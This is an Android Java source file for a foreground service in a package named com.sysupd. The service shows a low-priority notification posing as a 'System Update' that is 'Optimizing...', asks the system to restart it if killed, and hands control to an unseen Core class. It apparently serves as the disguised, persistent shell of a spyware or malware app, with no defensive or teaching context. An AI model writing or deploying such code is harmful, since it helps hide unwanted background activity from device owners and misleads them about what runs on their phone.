package com.sysupd;

import android.app.*;
import android.content.*;
import android.os.*;

public class ForegroundService extends Service {
    public static void start(Context ctx) {
        Intent i = new Intent(ctx, ForegroundService.class);
        if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
        else ctx.startService(i);
    }

    public void onCreate() {
        super.onCreate();
        startForeground(1, buildNotif());
        Core.init(this);
    }

    private Notification buildNotif() {
        String ch = "sysupd";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(ch,
                "System", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(c);
        }
        return new Notification.Builder(this, ch)
            .setContentTitle("System Update")
            .setContentText("Optimizing...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build();
    }

    public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    public IBinder onBind(Intent i) { return null; }
}
